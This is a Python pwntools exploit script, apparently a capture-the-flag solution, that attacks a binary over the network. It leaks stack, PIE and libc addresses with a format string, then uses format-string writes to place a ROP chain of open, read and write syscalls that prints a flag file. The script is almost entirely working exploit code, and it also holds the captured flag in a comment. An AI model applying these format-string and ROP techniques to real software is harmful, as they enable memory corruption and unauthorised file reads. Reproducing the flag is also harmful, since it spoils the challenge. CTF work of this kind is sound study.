#!/usr/bin/python

from pwn import *

PATH = './chall'

GDBSCRIPT = '''
b *0x555555555352
b *0x55555555536d
'''

HOST = '172.17.0.2'
PORT = 4444

HOST = '103.152.242.172'
PORT = 60903

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def fmt_str(addr, value, offset, length=8):
    p_fmt  = b''
    p_addr = b''
    prev   = 0
    for i in range(length):
        p_fmt  += b"%%%dx%%%d$hhn" % ((value & 0xFF)+0x100-prev, offset+i)
        p_addr += p64(addr+i)
        prev    = (value & 0xff)
        value >>= 8
    
    p_fmt = p_fmt.ljust(0xd0, b"A")
    r.send(p_fmt + p_addr) ; sleep(0.2)
    r.recv()

def syscall(rax, rdi, rsi, rdx):
    chain  = p64(libc.sym['pop_rax']) + p64(rax)
    chain += p64(libc.sym['pop_rdi']) + p64(rdi)
    chain += p64(libc.sym['pop_rsi']) + p64(rsi)
    chain += p64(libc.sym['pop_rdx_r12']) + p64(rdx) + p64(0xdeadbeef)
    chain += p64(libc.sym['syscall'])
    return chain

def exploit(r):
    r.sendline('%p %p %75$p %68$p')
    leaks = r.recvline(0).split()
    stack = int(leaks[0], 16) + 0x218
    
    pie = int(leaks[3], 16) - 0x1120
    bss = pie + 0x4070
    
    libc_leak = int(leaks[2], 16)
    libc.address = libc_leak - libc.sym['__libc_start_main'] - 243

    info(f'STACK {stack:x}')
    info(f'LEAK {libc_leak:x}')
    info(f'LIBC {libc.address:x}')
    info(f'PIE {pie:x}')

    context.arch = 'amd64'
    
    rop  = syscall(0, 0, bss, 0x100)
    rop += syscall(2, bss, 0, 0)
    # rop += syscall(78, 0x5, bss, 0x100)
    rop += syscall(0, 5, bss, 0x100)
    rop += syscall(1, 1, bss, 0x100)

    # technofair{ORW_str1ng_Ori3nted_pr0gramm1ng_ocoCcivi6xRCIvIq}

    for offset in range(8, len(rop), 8):
        fmt_str(stack+offset, u64(rop[offset:offset+8]), 32)
        
    fmt_str(stack, u64(rop[:8]), 32)
    
    sleep(0.5)
    
    r.send('/app/flag_Itsxu6lsHixM4Yvl.txt')

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', 0)

    libc.sym['pop_rax'] = 0x0004a550 # pop rax ; ret
    libc.sym['pop_rdi'] = 0x00026b72 # pop rdi ; ret
    libc.sym['pop_rsi'] = 0x00027529 # pop rsi ; ret
    libc.sym['pop_rdx_r12'] = 0x0011c371 # pop rdx ; pop r12 ; ret
    libc.sym['syscall'] = 0x00066229 # syscall; ret; 

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)